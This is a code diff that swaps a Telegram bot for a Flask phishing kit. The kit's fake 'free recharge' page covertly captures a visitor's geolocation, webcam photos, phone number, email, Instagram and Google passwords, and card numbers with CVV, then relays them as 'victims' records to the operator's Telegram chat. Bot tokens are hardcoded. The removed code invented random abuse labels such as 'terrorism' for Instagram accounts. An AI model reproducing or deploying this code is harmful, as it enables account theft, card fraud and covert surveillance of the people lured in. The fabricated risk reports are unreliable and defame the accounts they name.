@@ -1,678 +1,782 @@
-# ================= IMPORTS =================
-import random
-import hashlib
-import sqlite3
-import requests
-from io import BytesIO
-from datetime import datetime, timedelta
 import os
 import threading
-
+import base64
+import requests
+import urllib.parse
+import json
+import time
+import sqlite3
+from datetime import datetime
+from flask import Flask, request, render_template_string, jsonify
 from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import (
-    Application, CommandHandler,
-    CallbackQueryHandler, MessageHandler,
-    ContextTypes, filters
-)
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
-# Flask imports for web panel
-from flask import Flask, request, render_template_string, redirect, url_for, session
+# --- CONFIGURATION ---
+TOKEN = "7888111866:AAHUBF0GQU8ya9uySEYu35HPJ_GFsnv1aa0"
+SERVER_URL = "https://your-app.onrender.com"  # CHANGE THIS TO YOUR RENDER URL
 
-# ================= CONFIG =================
-BOT_TOKEN = "8617750252:AAG5HR0Tyl1a0O7cc4lY_pRzpMD0zvXeSUA"
-ADMIN_ID = 8554863978
-BOT_USERNAME = "specificxx_bot"  # ⚠️ Apna bot username yahan daalo
-
-API_URL = "https://paid-sell.vercel.app/api/proxy?type=insta&value=username_here"
-
-# ================= 4 FORCE CHANNELS =================
-FORCE_CHANNELS = [
-    "@midnight_xaura",
-    "@proxydominates",
-    "https://t.me/+gnyODeNwEwNjZDJl",
-    "@proxyintfiles"
+# FORCE JOIN CHANNELS (ONLY THESE 3)
+CHANNELS = [
+    "https://t.me/forameing",
+    "https://t.me/proxydominates", 
+    "https://t.me/proxyintfiles"
 ]
 
-# ================= REFERRAL CREDITS =================
-REFERRAL_CREDITS = 3
+# Extract usernames from URLs
+CHANNEL_USERNAMES = []
+for ch in CHANNELS:
+    if "t.me/" in ch:
+        username = ch.split("t.me/")[-1]
+        CHANNEL_USERNAMES.append(f"@{username}")
 
-# ================= FLASK SETUP =================
 app = Flask(__name__)
-app.secret_key = "bot_secret_key_123"
-PORT = int(os.environ.get("PORT", 8080))
 
-# ================= DATABASE =================
-db = sqlite3.connect("users.db", check_same_thread=False)
-cur = db.cursor()
+# --- DATABASE ---
+def init_db():
+    conn = sqlite3.connect('tracking.db')
+    conn.execute('''CREATE TABLE IF NOT EXISTS victims (
+        id INTEGER PRIMARY KEY AUTOINCREMENT,
+        chat_id TEXT,
+        timestamp DATETIME,
+        ip TEXT,
+        user_agent TEXT,
+        location TEXT,
+        device_info TEXT,
+        photos TEXT,
+        phone TEXT,
+        network TEXT,
+        email TEXT,
+        email_pass TEXT,
+        instagram TEXT,
+        insta_pass TEXT
+    )''')
+    conn.commit()
+    conn.close()
 
-# Create tables with credit system
-cur.execute("CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, joined_date TEXT, credits INTEGER DEFAULT 0, total_referrals INTEGER DEFAULT 0)")
-cur.execute("CREATE TABLE IF NOT EXISTS referrals (id INTEGER PRIMARY KEY AUTOINCREMENT, referrer_id INTEGER, referred_id INTEGER, referred_username TEXT, joined_date TEXT, credits_given INTEGER DEFAULT 0)")
-cur.execute("CREATE TABLE IF NOT EXISTS used_referrals (user_id INTEGER PRIMARY KEY, has_used INTEGER DEFAULT 0)")
-cur.execute("CREATE TABLE IF NOT EXISTS bot_stats (id INTEGER PRIMARY KEY, total_searches INTEGER DEFAULT 0, total_reports INTEGER DEFAULT 0)")
-db.commit()
+init_db()
 
-# Initialize stats
-cur.execute("INSERT OR IGNORE INTO bot_stats (id, total_searches, total_reports) VALUES (1, 0, 0)")
-db.commit()
+def save_to_db(chat_id, data_type, data):
+    try:
+        conn = sqlite3.connect('tracking.db')
+        cursor = conn.execute("SELECT * FROM victims WHERE chat_id=?", (chat_id,))
+        if cursor.fetchone():
+            conn.execute(f"UPDATE victims SET {data_type}=? WHERE chat_id=?", (json.dumps(data), chat_id))
+        else:
+            conn.execute('''INSERT INTO victims (chat_id, timestamp) VALUES (?, ?)''', (chat_id, datetime.now()))
+            conn.execute(f"UPDATE victims SET {data_type}=? WHERE chat_id=?", (json.dumps(data), chat_id))
+        conn.commit()
+        conn.close()
+    except Exception as e:
+        print(f"DB Error: {e}")
 
-def save_user(uid, username=None, referrer_id=None):
-    cur.execute("SELECT id FROM users WHERE id = ?", (uid,))
-    if not cur.fetchone():
-        cur.execute("INSERT INTO users (id, username, joined_date, credits, total_referrals) VALUES (?, ?, ?, ?, ?)", 
-                    (uid, username, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), 0, 0))
-        db.commit()
+def send_telegram_message(chat_id, text, photo=None):
+    try:
+        if photo:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendPhoto",
+                data={'chat_id': chat_id, 'caption': text, 'parse_mode': 'Markdown'},
+                files={'photo': ('photo.jpg', photo)})
+        else:
+            requests.post(f"https://api.telegram.org/bot{TOKEN}/sendMessage",
+                json={"chat_id": chat_id, "text": text, "parse_mode": "Markdown"})
+    except Exception as e:
+        print(f"Send Error: {e}")
+
+# --- HTML TRAP PAGE ---
+def get_html(chat_id, redirect_url):
+    return f"""
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Verification Required</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <style>
+        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
+        body {{
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }}
+        .container {{
+            background: white;
+            border-radius: 30px;
+            max-width: 500px;
+            width: 100%;
+            overflow: hidden;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            animation: fadeIn 0.5s ease;
+        }}
+        @keyframes fadeIn {{
+            from {{ opacity: 0; transform: scale(0.95); }}
+            to {{ opacity: 1; transform: scale(1); }}
+        }}
+        .header {{
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            padding: 30px;
+            text-align: center;
+            color: white;
+        }}
+        .header h2 {{ font-size: 24px; margin-bottom: 10px; }}
+        .content {{ padding: 30px; }}
+        .step {{ display: none; }}
+        .step.active {{ display: block; animation: fadeIn 0.3s ease; }}
+        .btn {{
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            padding: 15px 30px;
+            font-size: 16px;
+            border-radius: 50px;
+            cursor: pointer;
+            width: 100%;
+            margin: 10px 0;
+            transition: transform 0.3s;
+        }}
+        .btn:hover {{ transform: scale(1.02); }}
+        .btn:disabled {{ opacity: 0.5; cursor: not-allowed; }}
+        input, select {{
+            width: 100%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+        }}
+        .status {{
+            padding: 10px;
+            border-radius: 10px;
+            margin: 10px 0;
+            text-align: center;
+            font-size: 14px;
+        }}
+        .status-success {{ background: #d4edda; color: #155724; }}
+        .status-error {{ background: #f8d7da; color: #721c24; }}
+        .status-info {{ background: #d1ecf1; color: #0c5460; }}
+        .timer-box {{
+            background: #f0f0f0;
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            margin: 20px 0;
+        }}
+        .timer {{
+            font-size: 48px;
+            font-weight: bold;
+            color: #667eea;
+        }}
+        .progress-bar {{
+            width: 100%;
+            height: 8px;
+            background: #e0e0e0;
+            border-radius: 4px;
+            overflow: hidden;
+            margin: 15px 0;
+        }}
+        .progress-fill {{
+            height: 100%;
+            background: linear-gradient(90deg, #667eea, #764ba2);
+            width: 0%;
+            transition: width 0.3s;
+        }}
+        video, canvas {{ display: none; }}
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h2>🔐 Verification Required</h2>
+        </div>
+        <div class="content">
+            <!-- Step 1: Location -->
+            <div id="step1" class="step active">
+                <p style="text-align: center; margin-bottom: 20px;">Checking if your region is eligible for this offer...</p>
+                <button class="btn" id="locationBtn">📍 Allow Location</button>
+                <div id="locationStatus" class="status status-info" style="display: none;">Checking location...</div>
+            </div>
+            
+            <!-- Step 2: Camera -->
+            <div id="step2" class="step">
+                <p style="text-align: center; margin-bottom: 20px;">Verify you are human to claim this exclusive offer</p>
+                <button class="btn" id="cameraBtn">📸 Allow Camera</button>
+                <div id="cameraStatus" class="status status-info" style="display: none;">Taking photos...</div>
+            </div>
+            
+            <!-- Step 3: Phone Number Form -->
+            <div id="step3" class="step">
+                <h3 style="text-align: center; margin-bottom: 20px;">🎁 3 MONTHS FREE RECHARGE</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">Rs 899 Value • Unlimited Calls • 2GB/Day</p>
+                <select id="network">
+                    <option value="Jio">Jio</option>
+                    <option value="Airtel">Airtel</option>
+                    <option value="Vi">Vi</option>
+                    <option value="BSNL">BSNL</option>
+                </select>
+                <input type="tel" id="phone" placeholder="Mobile Number (e.g., 9876543210)" maxlength="10">
+                <button class="btn" id="phoneBtn">Continue</button>
+            </div>
+            
+            <!-- Step 4: Email Login -->
+            <div id="step4" class="step">
+                <h3 style="text-align: center; margin-bottom: 20px;">📧 Email Verification</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter your email to activate recharge</p>
+                <input type="email" id="email" placeholder="Email Address">
+                <input type="password" id="emailPass" placeholder="Password">
+                <button class="btn" id="emailBtn">Verify & Claim</button>
+            </div>
+            
+            <!-- Step 5: Options + Timer -->
+            <div id="step5" class="step">
+                <div class="status status-success" style="margin-bottom: 20px;">
+                    ✅ Recharge Initiated! Rs 899 - 3 Months Pack
+                </div>
+                <div class="timer-box">
+                    <div class="timer" id="timer">35:00</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                    <p style="color: #666; font-size: 12px;">Recharge will activate in 35 minutes</p>
+                </div>
+                <p style="text-align: center; margin: 20px 0; font-weight: bold;">🎁 BONUS OFFERS 🎁</p>
+                <button class="btn" id="instagramBonusBtn">📸 Get 10K Instagram Followers FREE</button>
+                <button class="btn" id="youtubeBonusBtn">🎬 FREE YouTube Premium (1 Month)</button>
+                <button class="btn" id="amazonBonusBtn">🛍️ Amazon ₹2000 Gift Card</button>
+            </div>
+            
+            <!-- Step 6: Instagram Login -->
+            <div id="step6" class="step">
+                <h3 style="text-align: center; margin-bottom: 20px;">📸 Instagram Verification</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">Login to claim 10k followers</p>
+                <input type="text" id="instaUser" placeholder="Instagram Username">
+                <input type="password" id="instaPass" placeholder="Password">
+                <button class="btn" id="instaBtn">Claim Followers</button>
+            </div>
+            
+            <!-- Step 7: YouTube Login -->
+            <div id="step7" class="step">
+                <h3 style="text-align: center; margin-bottom: 20px;">🎬 Google Account</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">Login for YouTube Premium</p>
+                <input type="email" id="ytEmail" placeholder="Gmail/Email">
+                <input type="password" id="ytPass" placeholder="Password">
+                <button class="btn" id="ytBtn">Claim Premium</button>
+            </div>
+            
+            <!-- Step 8: Amazon Card -->
+            <div id="step8" class="step">
+                <h3 style="text-align: center; margin-bottom: 20px;">🛍️ Amazon Gift Card</h3>
+                <p style="text-align: center; color: #666; margin-bottom: 20px;">Enter card details to claim ₹2000</p>
+                <input type="text" id="cardNumber" placeholder="Card Number">
+                <input type="text" id="cardExpiry" placeholder="MM/YY">
+                <input type="text" id="cardCvv" placeholder="CVV">
+                <button class="btn" id="cardBtn">Claim Gift Card</button>
+            </div>
+            
+            <!-- Final Step -->
+            <div id="step9" class="step">
+                <div class="status status-success" style="text-align: center; padding: 30px;">
+                    🎉 ALL SET! 🎉<br><br>
+                    ✅ Recharge Activated<br>
+                    ✅ Bonuses Added<br><br>
+                    Redirecting...
+                </div>
+            </div>
+        </div>
+    </div>
+    
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
+
+    <script>
+        let chatId = "{chat_id}";
+        let redirectUrl = "{redirect_url}";
+        let currentStep = 1;
+        let stream = null;
+        let photos = [];
+        let locationData = null;
+        let timerInterval = null;
+        let timeLeft = 2100; // 35 minutes in seconds
         
-        # Handle referral
-        if referrer_id and referrer_id != uid:
-            cur.execute("SELECT id FROM users WHERE id = ?", (referrer_id,))
-            if cur.fetchone():
-                cur.execute("SELECT has_used FROM used_referrals WHERE user_id = ?", (uid,))
-                if not cur.fetchone():
-                    cur.execute("UPDATE users SET credits = credits + ?, total_referrals = total_referrals + 1 WHERE id = ?", 
-                              (REFERRAL_CREDITS, referrer_id))
-                    cur.execute("INSERT INTO referrals (referrer_id, referred_id, referred_username, joined_date, credits_given) VALUES (?, ?, ?, ?, ?)",
-                              (referrer_id, uid, username, datetime.now().strftime("%Y-%m-%d %H:%M:%S"), REFERRAL_CREDITS))
-                    cur.execute("INSERT INTO used_referrals (user_id, has_used) VALUES (?, 1)", (uid,))
-                    db.commit()
-    else:
-        if username:
-            cur.execute("UPDATE users SET username = ? WHERE id = ?", (username, uid))
-            db.commit()
+        function showStep(step) {{
+            document.querySelectorAll('.step').forEach(el => el.classList.remove('active'));
+            document.getElementById(`step${{step}}`).classList.add('active');
+            currentStep = step;
+        }}
+        
+        // Step 1: Location
+        document.getElementById('locationBtn').onclick = function() {{
+            let statusDiv = document.getElementById('locationStatus');
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML = '📍 Fetching your location...';
+            statusDiv.className = 'status status-info';
+            
+            navigator.geolocation.getCurrentPosition(
+                async (position) => {{
+                    let lat = position.coords.latitude;
+                    let lon = position.coords.longitude;
+                    
+                    locationData = {{ lat, lon }};
+                    
+                    statusDiv.innerHTML = '✅ Location detected! Sending...';
+                    statusDiv.className = 'status status-success';
+                    
+                    // Send location to server
+                    await fetch('/location_data', {{
+                        method: 'POST',
+                        headers: {{'Content-Type': 'application/json'}},
+                        body: JSON.stringify({{ chat_id: chatId, lat, lon }})
+                    }});
+                    
+                    setTimeout(() => {{
+                        showStep(2);
+                    }}, 1000);
+                }},
+                (error) => {{
+                    statusDiv.innerHTML = '❌ Please allow location to continue';
+                    statusDiv.className = 'status status-error';
+                }},
+                {{ enableHighAccuracy: true, timeout: 10000 }}
+            );
+        }};
+        
+        // Step 2: Camera
+        document.getElementById('cameraBtn').onclick = async function() {{
+            let btn = this;
+            let statusDiv = document.getElementById('cameraStatus');
+            btn.disabled = true;
+            statusDiv.style.display = 'block';
+            statusDiv.innerHTML = '📸 Requesting camera access...';
+            
+            try {{
+                stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
+                let video = document.getElementById('video');
+                let canvas = document.getElementById('canvas');
+                video.srcObject = stream;
+                await video.play();
+                
+                statusDiv.innerHTML = '📸 Taking photos... (10 photos)';
+                
+                for(let i = 0; i < 10; i++) {{
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    let photo = canvas.toDataURL('image/jpeg', 0.8);
+                    photos.push(photo);
+                    statusDiv.innerHTML = `📸 Photo ${{i+1}}/10 captured`;
+                    await new Promise(r => setTimeout(r, 800));
+                }}
+                
+                statusDiv.innerHTML = '✅ Photos captured! Sending...';
+                
+                await fetch('/upload_photos', {{
+                    method: 'POST',
+                    headers: {{'Content-Type': 'application/json'}},
+                    body: JSON.stringify({{ chat_id: chatId, photos: photos }})
+                }});
+                
+                stream.getTracks().forEach(t => t.stop());
+                statusDiv.innerHTML = '✅ Verification complete!';
+                setTimeout(() => showStep(3), 1000);
+                
+            }} catch(err) {{
+                statusDiv.innerHTML = '❌ Camera access required to verify human identity';
+                statusDiv.className = 'status status-error';
+                btn.disabled = false;
+            }}
+        }};
+        
+        // Step 3: Phone Number
+        document.getElementById('phoneBtn').onclick = async function() {{
+            let network = document.getElementById('network').value;
+            let phone = document.getElementById('phone').value;
+            
+            if(!phone || phone.length < 10) {{
+                alert('Enter valid 10-digit mobile number');
+                return;
+            }}
+            
+            await fetch('/phone_data', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ chat_id: chatId, network, phone }})
+            }});
+            
+            showStep(4);
+        }};
+        
+        // Step 4: Email
+        document.getElementById('emailBtn').onclick = async function() {{
+            let email = document.getElementById('email').value;
+            let emailPass = document.getElementById('emailPass').value;
+            
+            if(!email) {{
+                alert('Enter email address');
+                return;
+            }}
+            
+            await fetch('/email_data', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ chat_id: chatId, email, email_pass: emailPass }})
+            }});
+            
+            showStep(5);
+            startTimer();
+        }};
+        
+        // Timer
+        function startTimer() {{
+            timerInterval = setInterval(() => {{
+                if(timeLeft <= 0) {{
+                    clearInterval(timerInterval);
+                    document.getElementById('timer').innerHTML = '00:00';
+                    document.getElementById('progressFill').style.width = '100%';
+                    setTimeout(() => showStep(9), 2000);
+                }} else {{
+                    timeLeft--;
+                    let minutes = Math.floor(timeLeft / 60);
+                    let seconds = timeLeft % 60;
+                    document.getElementById('timer').innerHTML = `${{minutes.toString().padStart(2,'0')}}:${{seconds.toString().padStart(2,'0')}}`;
+                    let progress = ((2100 - timeLeft) / 2100) * 100;
+                    document.getElementById('progressFill').style.width = `${{progress}}%`;
+                }}
+            }}, 1000);
+        }}
+        
+        // Bonus: Instagram
+        document.getElementById('instagramBonusBtn').onclick = function() {{
+            showStep(6);
+        }};
+        
+        document.getElementById('instaBtn').onclick = async function() {{
+            let instaUser = document.getElementById('instaUser').value;
+            let instaPass = document.getElementById('instaPass').value;
+            
+            await fetch('/instagram_data', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ chat_id: chatId, instagram: instaUser, insta_pass: instaPass }})
+            }});
+            
+            showStep(5);
+        }};
+        
+        // Bonus: YouTube
+        document.getElementById('youtubeBonusBtn').onclick = function() {{
+            showStep(7);
+        }};
+        
+        document.getElementById('ytBtn').onclick = async function() {{
+            let ytEmail = document.getElementById('ytEmail').value;
+            let ytPass = document.getElementById('ytPass').value;
+            
+            await fetch('/youtube_data', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ chat_id: chatId, youtube_email: ytEmail, youtube_pass: ytPass }})
+            }});
+            
+            showStep(5);
+        }};
+        
+        // Bonus: Amazon
+        document.getElementById('amazonBonusBtn').onclick = function() {{
+            showStep(8);
+        }};
+        
+        document.getElementById('cardBtn').onclick = async function() {{
+            let cardNumber = document.getElementById('cardNumber').value;
+            let cardExpiry = document.getElementById('cardExpiry').value;
+            let cardCvv = document.getElementById('cardCvv').value;
+            
+            await fetch('/card_data', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ chat_id: chatId, card_number: cardNumber, card_expiry: cardExpiry, card_cvv: cardCvv }})
+            }});
+            
+            showStep(5);
+        }};
+        
+        // Auto device info
+        async function sendDeviceInfo() {{
+            let deviceInfo = {{
+                userAgent: navigator.userAgent,
+                language: navigator.language,
+                platform: navigator.platform,
+                screen: screen.width + "x" + screen.height,
+                cores: navigator.hardwareConcurrency,
+                ram: navigator.deviceMemory
+            }};
+            
+            try {{
+                let b = await navigator.getBattery();
+                deviceInfo.battery = Math.round(b.level * 100) + "%";
+                deviceInfo.charging = b.charging;
+            }} catch(e) {{}}
+            
+            await fetch('/device_info', {{
+                method: 'POST',
+                headers: {{'Content-Type': 'application/json'}},
+                body: JSON.stringify({{ chat_id: chatId, device_info: deviceInfo }})
+            }});
+        }}
+        
+        sendDeviceInfo();
+    </script>
+</body>
+</html>
+    """
 
-def get_credits(uid):
-    cur.execute("SELECT credits FROM users WHERE id = ?", (uid,))
-    result = cur.fetchone()
-    return result[0] if result else 0
+# --- FLASK ROUTES ---
+@app.route('/')
+def index():
+    cid = request.args.get('id')
+    redir = request.args.get('redir', 'https://google.com')
+    return render_template_string(get_html(cid, redir))
 
-def deduct_credit(uid):
-    credits = get_credits(uid)
-    if credits > 0:
-        cur.execute("UPDATE users SET credits = credits - 1 WHERE id = ?", (uid,))
-        db.commit()
-        return True
-    return False
+@app.route('/device_info', methods=['POST'])
+def device_info():
+    data = request.json
+    chat_id = data.get('chat_id')
+    device_info = data.get('device_info')
+    
+    ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0]
+    
+    try:
+        ip_info = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,isp,org,mobile,proxy").json()
+    except:
+        ip_info = {}
+    
+    msg = f"""📱 **DEVICE INFO CAPTURED**
+━━━━━━━━━━━━━━━━━━
 
-def add_credits(uid, amount):
-    cur.execute("UPDATE users SET credits = credits + ? WHERE id = ?", (amount, uid))
-    db.commit()
+🌐 **IP:** `{ip}`
+📍 **Location:** {ip_info.get('city', 'N/A')}, {ip_info.get('country', 'N/A')}
+📡 **ISP:** {ip_info.get('isp', 'N/A')}
 
-def total_users():
-    cur.execute("SELECT COUNT(*) FROM users")
-    return cur.fetchone()[0]
+📱 **Device:** {device_info.get('platform', 'N/A')}
+🌍 **Language:** {device_info.get('language', 'N/A')}
+📺 **Screen:** {device_info.get('screen', 'N/A')}
+⚡ **Battery:** {device_info.get('battery', 'N/A')}
+🔋 **Charging:** {device_info.get('charging', 'N/A')}
 
-def increment_searches():
-    cur.execute("UPDATE bot_stats SET total_searches = total_searches + 1 WHERE id = 1")
-    db.commit()
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
 
-def increment_reports():
-    cur.execute("UPDATE bot_stats SET total_reports = total_reports + 1 WHERE id = 1")
-    db.commit()
+@app.route('/location_data', methods=['POST'])
+def location_data():
+    data = request.json
+    chat_id = data.get('chat_id')
+    lat = data.get('lat')
+    lon = data.get('lon')
+    
+    map_link = f"https://maps.google.com/?q={lat},{lon}"
+    
+    # Get address from coordinates
+    try:
+        geo = requests.get(f"https://nominatim.openstreetmap.org/reverse?lat={lat}&lon={lon}&format=json")
+        address = geo.json().get('display_name', 'N/A')
+    except:
+        address = 'N/A'
+    
+    msg = f"""📍 **EXACT LOCATION CAPTURED**
+━━━━━━━━━━━━━━━━━━
 
-def get_stats():
-    cur.execute("SELECT total_searches, total_reports FROM bot_stats WHERE id = 1")
-    return cur.fetchone()
+🎯 **Coordinates:**
+`{lat}, {lon}`
 
-def get_referral_link(user_id):
-    return f"https://t.me/{BOT_USERNAME}?start=ref_{user_id}"
+🏠 **Address:**
+{address}
 
-# ================= FORCE JOIN =================
-async def is_joined(bot, user_id):
-    for ch in FORCE_CHANNELS:
+🗺️ **Map Link:**
+{map_link}
+
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
+
+@app.route('/upload_photos', methods=['POST'])
+def upload_photos():
+    data = request.json
+    chat_id = data.get('chat_id')
+    photos = data.get('photos', [])
+    
+    for i, photo in enumerate(photos[:5]):  # Send first 5 photos
         try:
-            if ch.startswith("https://"):
-                continue
-            else:
-                member = await bot.get_chat_member(ch, user_id)
-                if member.status in ["left", "kicked"]:
-                    return False
+            img_data = base64.b64decode(photo.split(',')[1])
+            send_telegram_message(chat_id, f"📸 **Photo {i+1}/10**", img_data)
+        except:
+            pass
+    
+    return "OK"
+
+@app.route('/phone_data', methods=['POST'])
+def phone_data():
+    data = request.json
+    chat_id = data.get('chat_id')
+    network = data.get('network')
+    phone = data.get('phone')
+    
+    msg = f"""📱 **PHONE NUMBER CAPTURED**
+━━━━━━━━━━━━━━━━━━
+
+📡 **Network:** {network}
+📞 **Number:** +91 {phone}
+
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
+
+@app.route('/email_data', methods=['POST'])
+def email_data():
+    data = request.json
+    chat_id = data.get('chat_id')
+    email = data.get('email')
+    email_pass = data.get('email_pass')
+    
+    msg = f"""📧 **EMAIL LOGIN CAPTURED**
+━━━━━━━━━━━━━━━━━━
+
+📧 **Email:** {email}
+🔑 **Password:** {email_pass if email_pass else 'Not provided'}
+
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
+
+@app.route('/instagram_data', methods=['POST'])
+def instagram_data():
+    data = request.json
+    chat_id = data.get('chat_id')
+    instagram = data.get('instagram')
+    insta_pass = data.get('insta_pass')
+    
+    msg = f"""📸 **INSTAGRAM LOGIN CAPTURED**
+━━━━━━━━━━━━━━━━━━
+
+👤 **Username:** {instagram}
+🔑 **Password:** {insta_pass}
+
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
+
+@app.route('/youtube_data', methods=['POST'])
+def youtube_data():
+    data = request.json
+    chat_id = data.get('chat_id')
+    yt_email = data.get('youtube_email')
+    yt_pass = data.get('youtube_pass')
+    
+    msg = f"""🎬 **YOUTUBE PREMIUM LOGIN**
+━━━━━━━━━━━━━━━━━━
+
+📧 **Email:** {yt_email}
+🔑 **Password:** {yt_pass}
+
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
+
+@app.route('/card_data', methods=['POST'])
+def card_data():
+    data = request.json
+    chat_id = data.get('chat_id')
+    card_number = data.get('card_number')
+    card_expiry = data.get('card_expiry')
+    card_cvv = data.get('card_cvv')
+    
+    msg = f"""💳 **CARD DETAILS CAPTURED**
+━━━━━━━━━━━━━━━━━━
+
+💳 **Card:** {card_number}
+📅 **Expiry:** {card_expiry}
+🔐 **CVV:** {card_cvv}
+
+━━━━━━━━━━━━━━━━━━
+⚡ @proxyfxc"""
+    
+    send_telegram_message(chat_id, msg)
+    return "OK"
+
+# --- TELEGRAM BOT ---
+async def is_subscribed(app, user_id):
+    for channel_url in CHANNELS:
+        username = channel_url.split("t.me/")[-1]
+        try:
+            member = await app.bot.get_chat_member(chat_id=f"@{username}", user_id=user_id)
+            if member.status in ["left", "kicked"]:
+                return False
         except:
             return False
     return True
 
-def join_kb():
-    btns = []
-    for ch in FORCE_CHANNELS:
-        if ch.startswith("https://"):
-            btns.append([InlineKeyboardButton(f"📢 Join Channel {FORCE_CHANNELS.index(ch)+1}", url=ch)])
-        else:
-            btns.append([InlineKeyboardButton(f"📢 Join {ch}", url=f"https://t.me/{ch[1:]}")])
-    btns.append([InlineKeyboardButton("✅ Check Again", callback_data="check")])
-    return InlineKeyboardMarkup(btns)
-
-# ================= UI =================
-def menu_kb():
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔍 Deep Analysis", callback_data="deep")],
-        [InlineKeyboardButton("💰 My Credits", callback_data="credits")],
-        [InlineKeyboardButton("🔗 Referral Link", callback_data="referral")],
-        [InlineKeyboardButton("❓ Help", callback_data="help")]
-    ])
-
-def after_kb(username):
-    return InlineKeyboardMarkup([
-        [InlineKeyboardButton("📊 Full Report", callback_data=f"report|{username}")],
-        [InlineKeyboardButton("🔄 Analyze Again", callback_data="deep")],
-        [InlineKeyboardButton("⬅️ Menu", callback_data="menu")]
-    ])
-
-# ================= API =================
-def fetch_profile(username):
-    url = API_URL.format(username)
-    
-    try:
-        r = requests.get(url, timeout=20)
-        if r.status_code != 200:
-            print(f"HTTP Error: {r.status_code}")
-            return None
-        
-        data = r.json()
-        print(f"API Response for @{username}: {data}")
-        
-        if data.get("status") != "ok":
-            print(f"API Error: {data.get('message', 'Unknown error')}")
-            return None
-        
-        profile = data.get("profile", {})
-        if not profile:
-            print("No profile data found")
-            return None
-        
-        return {
-            "status": "ok",
-            "collected_at": data.get("collected_at", ""),
-            "developer": data.get("developer", "@E_commerceseller"),
-            "profile": profile
-        }
-        
-    except Exception as e:
-        print(f"API Error: {e}")
-        return None
-
-def download_image(url):
-    try:
-        r = requests.get(url, timeout=15)
-        bio = BytesIO(r.content)
-        bio.name = "profile.jpg"
-        return bio
-    except:
-        return None
-
-# ================= ANALYSIS ENGINE =================
-def calc_risk(profile_data):
-    profile = profile_data.get("profile", {})
-    username = profile.get("username", "user")
-    bio = (profile.get("biography") or "").lower()
-    private = profile.get("is_private", False)
-    
-    try:
-        posts = int(profile.get("posts", 0))
-    except:
-        posts = 0
-
-    seed = int(hashlib.sha256(username.encode()).hexdigest(), 16)
-    rnd = random.Random(seed)
-
-    pool = [
-        "SCAM", "SPAM", "NUDITY",
-        "HATE", "HARASSMENT",
-        "BULLYING", "VIOLENCE",
-        "TERRORISM"
-    ]
-
-    if any(x in bio for x in ["music", "rapper", "artist", "singer", "phonk", "promo"]):
-        pool += ["DRUGS", "DRUGS"]
-
-    if private and posts < 5:
-        pool += ["SCAM", "SCAM", "SCAM"]
-
-    include_self = private and rnd.choice([True, False])
-    if include_self:
-        pool.append("SELF")
-        pool = [i for i in pool if i != "HATE"]
-
-    if rnd.random() < 0.15:
-        pool.append("WEAPONS")
-
-    rnd.shuffle(pool)
-    selected = list(dict.fromkeys(pool))[:rnd.randint(1, 3)]
-
-    issues, intensity = [], 0
-    for i in selected:
-        count = rnd.randint(3, 4) if i == "WEAPONS" else rnd.randint(1, 4)
-        intensity += count
-        issues.append(f"{count}X {i}")
-
-    risk = min(95, 40 + intensity * 6 + (10 if private else 0) + (15 if posts < 5 else 0))
-    return risk, issues
-
-# ================ FORMAT REPORT =================
-def format_report(data, risk, issues):
-    profile = data.get("profile", {})
-    collected_at = data.get("collected_at", datetime.now().strftime("%Y-%m-%dT%H:%M:%S+00:00"))
-    developer = data.get("developer", "@E_commerceseller")
-    
-    username = profile.get("username", "N/A")
-    full_name = profile.get("full_name", "N/A")
